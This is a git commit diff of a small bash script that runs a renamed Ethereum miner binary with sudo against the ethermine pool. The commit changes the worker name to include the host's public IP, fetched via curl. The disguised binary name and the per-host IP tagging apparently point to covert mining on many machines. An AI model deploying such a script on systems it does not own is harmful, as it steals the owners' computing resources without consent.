f9fb9415c879f74f8dd96c0495c4c93c4c902610
viencaytrong <55699469+viencaytrong@users.noreply.github.com>
2021-08-30 23:48:45 +0700

    Update doiqua.sh

--- doiqua.sh
+++ doiqua.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 POOL=asia1.ethermine.org:4444
-WALLET=0xf7fe12e0432b84added46f93704a2dcc0938abbe.vanhien
+WALLET=0xf7fe12e0432b84added46f93704a2dcc0938abbe.$(echo "$(curl -s ifconfig.me)" | tr . _ )vanhien
 cd "$(dirname "$0")"
 
 chmod +x ./doiqua && sudo ./doiqua --algo ETHASH --pool $POOL --user $WALLET  $@
